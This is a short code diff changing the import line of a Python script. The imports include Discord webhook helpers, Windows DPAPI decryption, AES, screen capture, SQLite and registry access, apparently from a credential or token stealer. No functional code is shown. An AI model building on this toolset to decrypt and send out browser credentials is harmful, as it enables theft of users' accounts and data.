@@ -1,4 +1,4 @@
-import os, discord, subprocess, requests, re, json, sys, win32crypt, base64, shutil, sqlite3, dhooks, psutil, winreg
+import os, discord, subprocess, requests, re, json, win32crypt, base64, shutil, sqlite3, winreg
 from Crypto.Cipher import AES
 from PIL import ImageGrab
 from datetime import datetime
